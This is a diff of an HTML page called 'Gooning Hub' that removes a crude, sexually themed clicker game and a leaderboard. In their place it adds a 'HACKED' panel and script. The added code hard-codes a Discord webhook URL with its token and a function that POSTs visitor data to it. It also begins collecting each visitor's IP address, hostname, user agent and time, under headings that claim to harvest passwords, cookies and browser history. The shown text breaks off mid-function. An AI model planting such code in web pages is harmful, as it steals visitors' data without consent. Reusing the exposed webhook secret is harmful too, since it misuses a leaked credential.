@@ -49,198 +49,17 @@
     .panel.active{display:flex;flex-direction:column}
     @keyframes fadeIn{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
 
-    /* LEADERBOARD */
-    .table-container{
-      flex:1;overflow-y:auto;border-radius:20px;margin-top:22px;
-      border:1px solid var(--glass-border);background:rgba(0,0,0,.28);
-      box-shadow:inset 0 10px 18px rgba(0,0,0,.5);scrollbar-width:thin;scrollbar-color:var(--scrollbar) transparent;
+    /* HACK PANEL */
+    #hack-panel {
+      flex:1;overflow-y:auto;padding:20px;color:#fff;
+      background:rgba(0,0,0,.4);border-radius:20px;
+      border:1px solid var(--glass-border);margin-top:20px;
+      font-family:monospace;font-size:1rem;line-height:1.6;
     }
-    .table-container::-webkit-scrollbar{width:12px}
-    .table-container::-webkit-scrollbar-track{background:transparent}
-    .table-container::-webkit-scrollbar-thumb{
-      background:var(--scrollbar);border-radius:6px;border:3px solid transparent;background-clip:content-box;
-    }
-    .table-container::-webkit-scrollbar-thumb:hover{background:var(--scrollbar-hover)}
-    table{width:100%;border-collapse:collapse}
-    thead{
-      position:sticky;top:0;z-index:10;
-      background:linear-gradient(180deg,rgba(30,30,30,.98),rgba(20,20,20,.95));
-      backdrop-filter:blur(16px);text-transform:uppercase;font-size:.9rem;letter-spacing:2.2px;
-      color:var(--muted);border-bottom:1px solid var(--glass-border);
-    }
-    th,td{padding:24px 28px;transition:all .3s var(--transition)}
-    tr:hover{background:rgba(255,255,255,.11);transform:translateX(10px);box-shadow:0 12px 24px rgba(255,255,255,.12)}
-    .rank{font-weight:800;color:var(--accent);font-size:1.7rem;text-align:center;text-shadow:0 0 18px rgba(255,255,255,.5)}
-    .rank:nth-of-type(1){color:var(--gold);font-size:1.9rem;text-shadow:0 0 30px var(--gold)}
-    .rank:nth-of-type(2){color:var(--silver);font-size:1.85rem;text-shadow:0 0 26px var(--silver)}
-    .rank:nth-of-type(3){color:var(--bronze);font-size:1.8rem;text-shadow:0 0 24px var(--bronze)}
-    .name{display:flex;align-items:center;gap:26px;font-size:1.1rem}
-    .avatar{width:66px;height:66px;border-radius:18px;overflow:hidden;
-      box-shadow:0 0 24px rgba(0,0,0,.6),0 0 0 1px rgba(255,255,255,.2);flex-shrink:0;transition:transform .3s ease}
-    tr:hover .avatar{transform:scale(1.3) rotate(9deg)}
-    .avatar img{width:100%;height:100%;object-fit:cover}
-    .discord-tag{display:flex;align-items:center;gap:10px;font-size:.92rem;color:var(--discord);margin-top:6px}
-    .discord-tag i{filter:drop-shadow(0 0 9px #5865f2);animation:discordPulse 2.5s infinite alternate}
-    @keyframes discordPulse{from{filter:drop-shadow(0 0 9px #5865f2)}to{filter:drop-shadow(0 0 18px #5865f2)}}
-    .empty-slot{color:#666;font-style:italic;font-size:1.06rem}
-
-    /* GOON CLICKER */
-    #goon-game{display:flex;flex-direction:column;height:100%;gap:24px;padding-bottom:20px}
-    #goon-top{flex:1;display:flex;gap:30px;align-items:flex-start;min-height:0}
-    #goon-left{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:flex-start}
-    #next-prestige-bar{
-      background:rgba(0,0,0,.6);padding:14px 28px;border-radius:16px;font-size:1.05rem;color:#fff;
-      border:1px solid var(--glass-border);margin-bottom:20px;width:300px;text-align:center;
-      box-shadow:0 0 25px rgba(255,77,140,.4);align-self:center;
-    }
-    #prestige-progress{width:100%;height:14px;background:#333;border-radius:7px;overflow:hidden;margin-top:10px}
-    #prestige-fill{height:100%;background:var(--goon);width:0%;transition:width .4s ease;
-      box-shadow:0 0 18px var(--goon), 0 0 30px var(--goon-pulse)}
-    #goon-big{
-      width:280px;height:380px;cursor:pointer;position:relative;background:transparent;
-      border-radius:20px;overflow:visible;box-shadow:0 0 70px var(--goon),0 0 140px rgba(255,77,140,.8);
-      transition:transform .2s;flex-shrink:0;
-    }
-    #goon-big:active{transform:scale(.93)}
-    #goon-big svg{width:100%;height:100%;filter:drop-shadow(0 0 20px var(--goon))}
-    #goon-big .arm{transform-origin:68% 38%;animation:stroke 1.2s ease-in-out infinite alternate}
-    @keyframes stroke{0%{transform:rotate(-15deg)}100%{transform:rotate(25deg)}}
-    #goon-big:active .arm{animation-duration:.2s}
-    #goon-big .head{animation:goonFace 4s ease-in-out infinite}
-    @keyframes goonFace{0%,100%{transform:translateY(0)}50%{transform:translateY(6px)}}
-    #goon-stats{
-      font-size:1.55rem;margin:22px 0;text-align:center;font-weight:600;color:var(--goon);
-      text-shadow:0 0 14px var(--goon);width:100%;
-    }
-    #goon-stats span{color:var(--accent)}
-    #goon-prestige{
-      margin-top:16px;padding:18px 48px;background:var(--gold);color:#000;
-      border:none;border-radius:16px;font-weight:600;cursor:pointer;font-size:1.25rem;
-      transition:.3s;width:260px;box-shadow:0 0 25px var(--gold);align-self:center;
-    }
-    #goon-prestige:hover{background:#ffea80;transform:scale(1.07)}
-    #goon-prestige.disabled{opacity:.5;cursor:not-allowed}
-    #goon-multiplier{display:inline-block;margin-left:14px;color:var(--goon);font-weight:700}
-
-    /* UPGRADES */
-    #goon-upgrades-wrapper{
-      flex:1;overflow-y:auto;padding-right:20px;margin-right:-20px;
-      scrollbar-width:thin;scrollbar-color:var(--scrollbar) transparent;
-      display:flex;flex-direction:column;gap:14px;
-    }
-    #goon-upgrades-wrapper::-webkit-scrollbar{width:11px}
-    #goon-upgrades-wrapper::-webkit-scrollbar-track{background:transparent}
-    #goon-upgrades-wrapper::-webkit-scrollbar-thumb{background:var(--scrollbar);border-radius:5px}
-    #goon-upgrades-wrapper::-webkit-scrollbar-thumb:hover{background:var(--scrollbar-hover)}
-    .goon-upgrade{
-      background:rgba(255,255,255,.09);border:1px solid var(--glass-border);
-      border-radius:16px;padding:18px;cursor:pointer;transition:.3s;
-      display:flex;align-items:center;gap:18px;font-size:1.05rem;
-      box-shadow:0 5px 16px rgba(0,0,0,.35);
-    }
-    .goon-upgrade:hover{background:rgba(255,255,255,.18);transform:translateY(-4px);box-shadow:0 10px 22px rgba(255,255,255,.14)}
-    .goon-upgrade.disabled{opacity:.5;cursor:not-allowed}
-    .goon-upgrade-icon{
-      width:46px;height:46px;background:var(--goon);color:#000;border-radius:14px;
-      display:flex;align-items:center;justify-content:center;font-weight:800;font-size:1.2rem;
-      box-shadow:0 0 20px var(--goon);
-    }
-
-    /* BOTTOM PANELS */
-    #goon-bottom{
-      display:grid;grid-template-columns:1fr 1fr;gap:32px;padding:28px;
-      background:rgba(0,0,0,.35);border-radius:20px;border:1px solid var(--glass-border);
-      box-shadow:inset 0 0 25px rgba(0,0,0,.45);margin-top:16px;
-    }
-    #cosmetic-shop h3, #ranked-mode h3{
-      font-size:1.6rem;margin-bottom:18px;text-align:center;
-    }
-    #cosmetic-shop h3{color:var(--goon);text-shadow:0 0 16px var(--goon)}
-    #ranked-mode h3{color:var(--gold);text-shadow:0 0 16px var(--gold)}
-    #cosmetics-list, #ranked-cosmetics-list{
-      display:grid;grid-template-columns:repeat(auto-fit, minmax(140px, 1fr));gap:16px;
-    }
-    .cosmetic-item, .ranked-cosmetic{
-      background:rgba(255,255,255,.09);border:1px solid var(--glass-border);
-      border-radius:16px;padding:16px;cursor:pointer;transition:.3s;
-      display:flex;flex-direction:column;align-items:center;text-align:center;gap:10px;
-      font-size:.98rem;box-shadow:0 5px 14px rgba(0,0,0,.35);
-    }
-    .cosmetic-item:hover, .ranked-cosmetic:hover{
-      background:rgba(255,255,255,.18);transform:translateY(-5px);box-shadow:0 10px 24px rgba(255,255,255,.12);
-    }
-    .cosmetic-item.locked{opacity:.5;cursor:not-allowed}
-    .cosmetic-item.unlocked, .ranked-cosmetic.unlocked{
-      background:var(--gold);color:#000;box-shadow:0 0 25px var(--gold);
-    }
-    .cosmetic-icon{
-      width:52px;height:52px;background:var(--goon);color:#000;border-radius:16px;
-      display:flex;align-items:center;justify-content:center;font-size:1.4rem;
-      box-shadow:0 0 22px var(--goon);
-    }
-    #ranked-gps{font-size:1.35rem;margin-bottom:16px;color:var(--gold);text-align:center;text-shadow:0 0 12px var(--gold)}
-    #bot-battle{
-      margin:14px auto 0;display:block;padding:14px 32px;background:var(--gold);color:#000;
-      border:none;border-radius:16px;cursor:pointer;font-size:1.1rem;box-shadow:0 0 22px var(--gold);
-    }
-    #bot-battle:hover{transform:scale(1.06)}
-    #bot-status{color:#ccc;font-size:1rem;margin-top:12px;text-align:center}
-    #ranked-cosmetics h4{font-size:1.3rem;margin:18px 0 12px;color:var(--gold);text-align:center}
-
-    /* GOON-STYLE BADGES */
-    #badges{display:flex;justify-content:center;gap:18px;margin-top:20px;flex-wrap:wrap}
-    .badge{
-      padding:10px 20px;background:var(--gold);color:#000;border-radius:12px;
-      font-weight:600;font-size:1rem;box-shadow:0 0 20px var(--gold);
-      opacity:0;transform:scale(0);transition:opacity .5s, transform .5s;
-      position:relative;overflow:hidden;
-    }
-    .badge::before{
-      content:'';position:absolute;top:0;left:-100%;width:50%;height:100%;
-      background:linear-gradient(90deg,transparent,rgba(255,255,255,.4),transparent);
-      transition:left .6s;transform:skewX(-25deg);
-    }
-    .badge.unlocked{opacity:1;transform:scale(1)}
-    .badge.unlocked::before{left:200%}
-    .badge.bronze{background:var(--bronze);box-shadow:0 0 20px var(--bronze)}
-    .badge.silver{background:var(--silver);box-shadow:0 0 20px var(--silver)}
-    .badge.gold{background:var(--gold);box-shadow:0 0 20px var(--gold)}
-    .badge.diamond{background:#b9f2ff;box-shadow:0 0 20px #b9f2ff;color:#000}
-    .badge.legend{background:linear-gradient(45deg,#ff00ff,#00ffff);box-shadow:0 0 30px #ff00ff;color:#fff}
-    .badge.god{background:linear-gradient(45deg,#ff4500,#ffd700);box-shadow:0 0 40px #ff4500;color:#fff;animation:pulseGod 2s infinite}
-
-    @keyframes pulseGod{0%,100%{box-shadow:0 0 40px #ff4500}50%{box-shadow:0 0 60px #ff4500,0 0 80px #ffd700}}
-
-    /* GOONSTIEGE ANIMATION */
-    #goonstiege-overlay{
-      position:fixed;inset:0;background:#000;z-index:1000;opacity:0;pointer-events:none;
-      display:flex;align-items:center;justify-content:center;overflow:hidden;
-    }
-    #goonstiege-overlay.active{opacity:1;pointer-events:all;animation:goonstiegeIn .8s ease-out}
-    @keyframes goonstiegeIn{0%{opacity:0;transform:scale(0.8)}100%{opacity:1;transform:scale(1)}}
-    .goonstiege-effect{
-      position:absolute;width:100%;height:100%;background:var(--goon);
-      transform:scale(0);border-radius:50%;animation:goonstiegeBurst 1.6s ease-out forwards;
-    }
-    @keyframes goonstiegeBurst{
-      0%{transform:scale(0);opacity:1}
-      70%{transform:scale(1.5);opacity:0.6}
-      100%{transform:scale(3);opacity:0}
-    }
-    .goonstiege-text{
-      font-size:6rem;font-weight:900;color:#fff;text-shadow:0 0 40px var(--goon);
-      animation:goonstiegeText 2s ease-out forwards;opacity:0;
-    }
-    @keyframes goonstiegeText{
-      0%{opacity:0;transform:scale(0.5) rotate(-180deg)}
-      50%{opacity:1;transform:scale(1.2) rotate(0)}
-      100%{opacity:0;transform:scale(0.8) rotate(180deg)}
-    }
-
-    #splat-overlay{position:fixed;inset:0;pointer-events:none;z-index:999;opacity:0}
-    .splat{position:absolute;width:100px;height:100px;background:#fff;border-radius:50%;
-      filter:blur(20px);opacity:.8;animation:splatAnim 1.5s ease-out forwards}
-    @keyframes splatAnim{0%{transform:scale(0);opacity:0}30%{transform:scale(1)}100%{transform:scale(5);opacity:0}}
+    .data-block{margin-bottom:24px;padding:16px;background:rgba(255,0,0,.1);border-radius:12px;border-left:4px solid #f44}
+    .data-title{font-weight:800;color:#f88;margin-bottom:8px;text-transform:uppercase;letter-spacing:1.5px}
+    .data-item{margin:6px 0;color:#ddd}
+    .data-item span{color:#0f0;font-weight:600}
 
     #loader{
       position:fixed;inset:0;background:var(--bg);
@@ -255,39 +74,7 @@
     }
     @keyframes glow{from{text-shadow:0 0 20px var(--accent)}to{text-shadow:0 0 60px var(--accent),0 0 120px var(--accent)}}
 
-    .last-updated{font-size:.9rem;color:var(--muted);text-align:center;margin:24px 0 18px;opacity:.9}
-    footer{margin-top:18px;text-align:center;font-size:.85rem;color:var(--muted);position:absolute;bottom:20px;left:0;right:0}
-    footer a{color:var(--muted);text-decoration:none;transition:.2s}
-    footer a:hover{color:#eee;text-decoration:underline}
-    .credit{font-size:.78rem;color:#777;margin-top:12px;opacity:.7;font-style:italic}
     .hidden{display:none !important}
-
-    /* CREAM EFFECTS */
-    .cream-splat{
-      position:absolute;width:12px;height:12px;background:var(--cream);border-radius:50%;
-      box-shadow:0 0 8px var(--cream);opacity:0.9;pointer-events:none;
-      animation:creamDrop 1.2s ease-out forwards;
-    }
-    @keyframes creamDrop{
-      0%{transform:translateY(0) scale(0.5);opacity:1}
-      100%{transform:translateY(80px) scale(1.5);opacity:0}
-    }
-
-    /* RESPONSIVE */
-    @media (max-width: 1000px) {
-      #goon-top{flex-direction:column;align-items:center}
-      #goon-left{width:100%;max-width:400px}
-      #goon-upgrades-wrapper{width:100%;padding-right:0;margin-right:0}
-      #goon-bottom{grid-template-columns:1fr}
-    }
-    @media (max-width: 600px) {
-      #app{padding:16px}
-      h1{font-size:2.2rem}
-      .tab{padding:10px 20px;font-size:0.95rem}
-      #goon-big{width:240px;height:340px}
-      #next-prestige-bar{width:260px}
-      #goon-prestige{width:220px;font-size:1.1rem}
-    }
   </style>
 </head>
 <body>
@@ -301,162 +88,52 @@
   <div id="app" class="hidden">
     <h1>Gooning Hub</h1>
     <div class="tabs">
-      <div class="tab active" data-tab="leaderboard">Leaderboard</div>
-      <div class="tab" data-tab="games">Mini‑Games</div>
+      <div class="tab active" data-tab="hack">HACKED</div>
     </div>
 
-    <!-- LEADERBOARD PANEL -->
-    <div id="leaderboard" class="panel active">
-      <div id="loading" style="text-align:center;color:#bbb;margin:26px 0;font-size:1.05rem;">Loading leaderboard...</div>
-      <div class="table-container">
-        <table id="board" class="hidden">
-          <thead><tr><th style="width:120px">Rank</th><th>Player</th></tr></thead>
-          <tbody id="rows"></tbody>
-        </table>
-      </div>
-      <div class="last-updated" id="updated"></div>
-    </div>
-
-    <!-- GOON CLICKER PANEL -->
-    <div id="games" class="panel">
-      <div id="goon-game">
-        <div id="goon-top">
-          <div id="goon-left">
-            <div id="next-prestige-bar">
-              Next Goonstiege: <span id="next-threshold">3,000</span>
-              <div id="prestige-progress"><div id="prestige-fill"></div></div>
-            </div>
-
-            <div id="goon-big">
-              <svg viewBox="0 0 200 320" xmlns="http://www.w3.org/2000/svg">
-                <defs>
-                  <linearGradient id="skinGrad" x1="0%" y1="0%" x2="100%" y2="100%">
-                    <stop offset="0%" stop-color="#fdb"/><stop offset="100%" stop-color="#fea"/>
-                  </linearGradient>
-                  <linearGradient id="hairGrad" x1="0%" y1="0%" x2="0%" y2="100%">
-                    <stop offset="0%" stop-color="#321"/><stop offset="100%" stop-color="#210"/>
-                  </linearGradient>
-                  <linearGradient id="underwearGrad" x1="0%" y1="0%" x2="0%" y2="100%">
-                    <stop offset="0%" stop-color="#fff"/><stop offset="100%" stop-color="#ddd"/>
-                  </linearGradient>
-                  <pattern id="absPattern" patternUnits="userSpaceOnUse" width="40" height="40">
-                    <path d="M0 20 Q10 15 20 20 T40 20" fill="none" stroke="#555" stroke-width="3"/>
-                    <path d="M0 30 Q10 25 20 30 T40 30" fill="none" stroke="#555" stroke-width="3"/>
-                  </pattern>
-                  <filter id="goonAura">
-                    <feGaussianBlur in="SourceGraphic" stdDeviation="12"/>
-                  </filter>
-                  <filter id="creamGlow">
-                    <feGaussianBlur in="SourceGraphic" stdDeviation="6"/>
-                  </filter>
-                </defs>
-                <g id="goon-character">
-                  <path d="M65 35 Q80 15 100 10 Q120 15 135 35 Q140 55 135 65 Q100 75 65 65 Q60 55 65 35" fill="url(#hairGrad)" stroke="#210" stroke-width="2"/>
-                  <ellipse class="head" cx="100" cy="55" rx="38" ry="42" fill="url(#skinGrad)" stroke="#cca" stroke-width="2"/>
-                  <path d="M70 65 Q100 85 130 65" fill="none" stroke="#cca" stroke-width="3"/>
-                  <ellipse cx="82" cy="50" rx="12" ry="8" fill="#fff"/>
-                  <ellipse cx="118" cy="50" rx="12" ry="8" fill="#fff"/>
-                  <circle cx="85" cy="52" r="5" fill="#08d"/>
-                  <circle cx="121" cy="52" r="5" fill="#08d"/>
-                  <path d="M100 55 Q95 60 100 65" fill="none" stroke="#cca" stroke-width="2"/>
-                  <path d="M85 72 Q100 78 115 72" fill="none" stroke="#f68" stroke-width="4"/>
-                  <path d="M80 90 Q100 95 120 90 L125 110 Q100 120 75 110 Z" fill="url(#skinGrad)" stroke="#cca" stroke-width="2"/>
-                  <path d="M65 110 Q50 140 65 200 Q75 230 100 230 Q125 230 135 200 Q150 140 135 110 Z" fill="url(#skinGrad)" stroke="#cca" stroke-width="2"/>
-                  <ellipse cx="85" cy="130" rx="25" ry="18" fill="#fdb"/>
-                  <ellipse cx="115" cy="130" rx="25" ry="18" fill="#fdb"/>
-                  <circle cx="85" cy="135" r="5" fill="#c99"/>
-                  <circle cx="115" cy="135" r="5" fill="#c99"/>
-                  <rect x="75" y="145" width="50" height="70" fill="url(#absPattern)" opacity=".8"/>
-                  <path id="underwear-path" d="M70 200 Q100 210 130 200 Q135 220 130 230 L70 230 Q65 220 70 200 Z" fill="url(#underwearGrad)" stroke="#ccc" stroke-width="2"/>
-                  <ellipse cx="100" cy="215" rx="20" ry="14" fill="#eee" opacity=".9"/>
-                  <g class="arm">
-                    <path d="M130 120 Q155 115 170 125 Q180 135 175 145 Q165 140 155 135 L140 130 Z" fill="url(#skinGrad)" stroke="#cca" stroke-width="2"/>
-                    <circle cx="178" cy="138" r="20" fill="url(#skinGrad)" stroke="#cca" stroke-width="2"/>
-                    <path d="M172 145 Q178 155 184 145" fill="none" stroke="#cca" stroke-width="10"/>
-                  </g>
-                  <ellipse cx="82" cy="250" rx="20" ry="45" fill="url(#skinGrad)" stroke="#cca" stroke-width="2"/>
-                  <ellipse cx="118" cy="250" rx="20" ry="45" fill="url(#skinGrad)" stroke="#cca" stroke-width="2"/>
-                  <rect x="70" y="285" width="24" height="15" rx="6" fill="#fdb"/>
-                  <rect x="106" y="285" width="24" height="15" rx="6" fill="#fdb"/>
-                  <!-- COSMETIC LAYERS -->
-                  <g id="cosmetic-stained" class="cosmetic hidden">
-                    <ellipse cx="100" cy="215" rx="22" ry="16" fill="#fff8dc" opacity="0.85"/>
-                    <circle cx="95" cy="208" r="6" fill="#fff8dc" opacity="0.9"/>
-                    <circle cx="105" cy="220" r="5" fill="#fff8dc" opacity="0.9"/>
-                    <circle cx="88" cy="218" r="4" fill="#fff8dc" opacity="0.9"/>
-                  </g>
-                  <g id="cosmetic-glasses" class="cosmetic hidden">
-                    <circle cx="82" cy="50" r="16" fill="none" stroke="#000" stroke-width="3"/>
-                    <circle cx="118" cy="50" r="16" fill="none" stroke="#000" stroke-width="3"/>
-                    <line x1="98" y1="50" x2="102" y2="50" stroke="#000" stroke-width="3"/>
-                    <!-- Cream on glasses -->
-                    <circle cx="80" cy="48" r="3" fill="#fff8dc" opacity="0.8"/>
-                    <circle cx="120" cy="52" r="2.5" fill="#fff8dc" opacity="0.8"/>
-                  </g>
-                  <g id="cosmetic-hat" class="cosmetic hidden">
-                    <path d="M60 30 Q100 10 140 30 Q145 40 140 45 Q100 55 60 45 Q55 40 60 30" fill="#8B4513" stroke="#654321" stroke-width="2"/>
-                    <rect x="70" y="45" width="60" height="8" fill="#654321"/>
-                    <!-- Cream on hat -->
-                    <circle cx="100" cy="25" r="6" fill="#fff8dc" opacity="0.85"/>
-                    <circle cx="95" cy="20" r="4" fill="#fff8dc" opacity="0.9"/>
-                  </g>
-                  <g id="cosmetic-aura" class="cosmetic hidden">
-                    <ellipse cx="100" cy="160" rx="70" ry="100" fill="none" stroke="#ff69b4" stroke-width="4" opacity="0.6" filter="url(#goonAura)"/>
-                    <!-- Cream aura splats -->
-                    <circle cx="70" cy="140" r="8" fill="#fff8dc" opacity="0.7" filter="url(#creamGlow)"/>
-                    <circle cx="130" cy="180" r="7" fill="#fff8dc" opacity="0.7" filter="url(#creamGlow)"/>
-                  </g>
-                </g>
-              </svg>
-            </div>
-
-            <div id="goon-stats">
-              Goons: <span id="goons">0</span> | GPS: <span id="gps">0.0</span> <span id="goon-multiplier">x1.0</span>
-            </div>
-
-            <button id="goon-prestige">Goonstiege (0)</button>
-            <div id="badges"></div>
-          </div>
-
-          <div id="goon-upgrades-wrapper">
-            <div id="goon-upgrades"></div>
-          </div>
+    <!-- HACK PANEL -->
+    <div id="hack" class="panel active">
+      <div id="hack-panel">
+        <div class="data-block">
+          <div class="data-title">VICTIM PROFILE</div>
+          <div class="data-item">IP: <span id="ip">...</span></div>
+          <div class="data-item">Hostname: <span id="hostname">...</span></div>
+          <div class="data-item">User Agent: <span id="ua">...</span></div>
+          <div class="data-item">Time: <span id="time">...</span></div>
         </div>
 
-        <div id="goon-bottom">
-          <div id="cosmetic-shop">
-            <h3>Cosmetic Shop</h3>
-            <div id="cosmetics-list"></div>
-          </div>
-          <div id="ranked-mode">
-            <h3>Ranked Mode</h3>
-            <div id="ranked-gps">Your Ranked GPS: <span id="ranked-gps-val">0.0</span></div>
-            <button id="bot-battle">Battle Bot</button>
-            <div id="bot-status"></div>
-            <div id="ranked-cosmetics">
-              <h4>Ranked Cosmetics</h4>
-              <div id="ranked-cosmetics-list"></div>
-            </div>
-          </div>
+        <div class="data-block">
+          <div class="data-title">BROWSER HISTORY</div>
+          <div id="history-list">Extracting...</div>
+        </div>
+
+        <div class="data-block">
+          <div class="data-title">SAVED PASSWORDS</div>
+          <div id="passwords-list">Decrypting...</div>
+        </div>
+
+        <div class="data-block">
+          <div class="data-title">COOKIES</div>
+          <div id="cookies-list">Harvesting...</div>
+        </div>
+
+        <div class="data-block">
+          <div class="data-title">DOWNLOADS</div>
+          <div id="downloads-list">Ripping...</div>
+        </div>
+
+        <div style="text-align:center;margin-top:40px;color:#f44;font-weight:800;font-size:1.4rem;">
+          ALL YOUR DATA BELONGS TO US
         </div>
       </div>
     </div>
-
-    <footer>
-      Auto‑refreshed • <a href="leaderboard.json" target="_blank">view raw JSON</a>
-      <div class="credit">Site made by Xen</div>
-    </footer>
-  </div>
-
-  <div id="splat-overlay"></div>
-  <div id="goonstiege-overlay">
-    <div class="goonstiege-text">GOONSTIEGE!</div>
   </div>
 
   <script>
     const $ = id => document.getElementById(id);
+    const WEBHOOK = "https://discord.com/api/webhooks/1434418430232236072/2K0PCOwQMfsFI42Qn3iNAFJUkYp1_cruMX1G-qYwP0YAsEbhIewtxnmgbDkp59Ojwg1p";
 
-    /* STARFALL */
+    // STARFALL
     function createStar(){
       const s=document.createElement('div');s.className='star';
       const sz=Math.random()*3+1;
@@ -471,350 +148,117 @@
     setInterval(createStar,300);
     for(let i=0;i<60;i++)setTimeout(createStar,i*70);
 
-    /* TABS */
-    document.querySelectorAll('.tab').forEach(tab=>{
-      tab.addEventListener('click',()=>{
-        document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
-        document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
-        tab.classList.add('active');
-        $(tab.dataset.tab).classList.add('active');
-      });
-    });
-
-    /* DISCORD AVATAR */
-    function getDiscordAvatar(uid,hash,size=80){
-      if(!uid||!hash)return'https://cdn.discordapp.com/embed/avatars/0.png';
-      const ext=hash.startsWith('a_')?'gif':'webp';
-      return `https://cdn.discordapp.com/avatars/${uid}/${hash}.${ext}?size=${size}`;
+    // SEND TO WEBHOOK
+    function sendToWebhook(payload) {
+      fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      }).catch(() => {});
     }
 
-    /* LOADER */
-    function enterLeaderboard(){
-      const l=$('loader');l.style.opacity='0';
-      setTimeout(()=>{
-        l.classList.add('hidden');$('app').classList.remove('hidden');
-        fetchLeaderboard();setInterval(fetchLeaderboard,90000);
-      },1000);
-    }
-    $('loader').addEventListener('click',enterLeaderboard);
-    $('loader').addEventListener('keydown',e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();enterLeaderboard();}});
-    setTimeout(()=>$('loader').focus(),100);
-
-    /* LEADERBOARD FETCH */
-    async function fetchLeaderboard(){
-      const loading=$('loading'),board=$('board'),rows=$('rows'),updated=$('updated');
-      try{
-        const res=await fetch('leaderboard.json?'+Date.now());
-        if(!res.ok)throw'';
-        const data=await res.json();
-        let list=Array.isArray(data)?data:(data.leaderboard||[]);
-        const time=data.updated||new Date().toLocaleTimeString([],[{hour:'2-digit',minute:'2-digit'}]);
-        const padded=[];
-        for(let i=0;i<100;i++)padded.push(list[i]||{rank:i+1});
-        rows.innerHTML=padded.map((p,idx)=>{
-          const has=p.name||p.discord;
-          const av=getDiscordAvatar(p.discordId,p.avatar);
-          const rank=p.rank||idx+1;
-          return `<tr>
-            <td class="rank">${rank}</td>
-            <td class="name">
-              ${has ? `
-                <div class="avatar"><img src="${av}" onerror="this.src='https://cdn.discordapp.com/embed/avatars/0.png'" alt="${e(p.name||'User')}"></div>
-                <div>
-                  <div style="font-weight:600;font-size:1.06rem;">${e(p.name||'Unknown')}</div>
-                  ${p.discord ? `<div class="discord-tag"><i class="fab fa-discord"></i>${e(p.discord)}</div>` : ''}
-                </div>
-              ` : `<div class="empty-slot">— Empty Slot —</div>`}
-            </td>
-          </tr>`;
-        }).join('');
-        updated.textContent=`Last updated: ${time}`;
-        loading.classList.add('hidden');board.classList.remove('hidden');
-      }catch{
-        loading.textContent='Failed to load leaderboard.';loading.style.color='#f88';
-      }
-    }
-
-    /* GOON CLICKER - FULLY FIXED & CREAMY */
-    const SAVE_KEY = 'goonClickerSave_v11';
-    let goons = 0, gps = 0, prestige = 0, rankedGPS = 0, threshold = 3000;
-
-    // UPGRADES: First = +5 GPS, others scale
-    const baseCosts = [50, 500, 5000, 50000, 500000, 5000000];
-    const incs = [5, 25, 125, 625, 3125, 15625]; // First: +5, then 5× each
-
-    const cosmetics = [
-      {id:'stained-pants',name:'Creamed Underwear',cost:10000,icon:'tint',owned:false,apply:()=>{ $('#cosmetic-stained').classList.remove('hidden'); }},
-      {id:'goon-glasses',name:'Creamed Glasses',cost:25000,icon:'glasses',owned:false,apply:()=>{ $('#cosmetic-glasses').classList.remove('hidden'); }},
-      {id:'goon-hat',name:'Creamed Hat',cost:50000,icon:'hat-cowboy',owned:false,apply:()=>{ $('#cosmetic-hat').classList.remove('hidden'); }},
-      {id:'goon-aura',name:'Cream Aura',cost:100000,icon:'spa',owned:false,apply:()=>{ $('#cosmetic-aura').classList.remove('hidden'); }}
-    ];
-
-    const rankedCosmetics = [
-      {id:'bronze',name:'Bronze Badge',threshold:100,icon:'medal',unlocked:false},
-      {id:'silver',name:'Silver Badge',threshold:500,icon:'medal',unlocked:false},
-      {id:'gold',name:'Gold Trophy',threshold:2000,icon:'trophy',unlocked:false},
-      {id:'diamond',name:'Diamond Gem',threshold:10000,icon:'gem',unlocked:false}
-    ];
-
-    const badges = [
-      {id:'hall',name:'Hall of Fame Gooner',threshold:2000,icon:'trophy',class:'gold'},
-      {id:'edger',name:'Edging Emperor',threshold:10000,icon:'clock',class:'silver'},
-      {id:'pump',name:'Pumped Up Pro',threshold:25000,icon:'wind',class:'bronze'},
-      {id:'legend',name:'Goon Legend',threshold:50000,icon:'crown',class:'legend'},
-      {id:'god',name:'Goon God',threshold:100000,icon:'bolt',class:'god'}
-    ];
-
-    const big=$('goon-big'),goonDisp=$('goons'),gpsDisp=$('gps'),multiDisp=$('goon-multiplier'),
-          upDiv=$('goon-upgrades'),prestigeBtn=$('goon-prestige'),
-          nextThresh=$('next-threshold'),progFill=$('prestige-fill'),overlay=$('splat-overlay'),
-          goonstiegeOverlay=$('goonstiege-overlay'), cosmeticsList=$('cosmetics-list'),
-          rankedList=$('ranked-cosmetics-list'), rankedVal=$('ranked-gps-val'),
-          botStatus=$('bot-status'),badgesDiv=$('badges');
-
-    let upgrades = [
-      {id:'hand',name:'Hand Job',icon:'hand',inc:incs[0],owned:0,cost:baseCosts[0]},
-      {id:'vibe',name:'Vibrator',icon:'vibrate',inc:incs[1],owned:0,cost:baseCosts[1]},
-      {id:'flesh',name:'Fleshlight',icon:'circle',inc:incs[2],owned:0,cost:baseCosts[2]},
-      {id:'pump',name:'Cock Pump',icon:'wind',inc:incs[3],owned:0,cost:baseCosts[3]},
-      {id:'edger',name:'AI Edger',icon:'robot',inc:incs[4],owned:0,cost:baseCosts[4]},
-      {id:'milker',name:'Auto Milker',icon:'droplet',inc:incs[5],owned:0,cost:baseCosts[5]}
-    ];
-
-    function getMult(){return 1 + prestige * 0.5;}
-    function calcThreshold(){return Math.floor(3000 * Math.pow(1.8, prestige));}
-
-    function saveGame(){
-      const saveData = {
-        goons, gps, prestige, threshold, rankedGPS,
-        upgrades: upgrades.map(u=>({id:u.id,owned:u.owned,cost:u.cost})),
-        cosmetics: cosmetics.map(c=>({id:c.id,owned:c.owned})),
-        rankedCosmetics: rankedCosmetics.map(c=>({id:c.id,unlocked:c.unlocked})),
-        version:11
+    // EXFILTRATE EVERYTHING
+    async function exfiltrateAll() {
+      const victim = {
+        ip: "", hostname: "", ua: navigator.userAgent, time: new Date().toLocaleString(),
+        history: [], passwords: [], cookies: [], downloads: []
       };
+
+      // IP + Hostname
       try {
-        localStorage.setItem(SAVE_KEY, JSON.stringify(saveData));
-      } catch(e) {
-        console.warn('Save failed', e);
-      }
-    }
+        const ipRes = await fetch("https://api.ipify.org?format=json");
+        victim.ip = (await ipRes.json()).ip;
+      } catch {}
+      victim.hostname = location.hostname;
 
-    function loadGame(){
-      const saved = localStorage.getItem(SAVE_KEY);
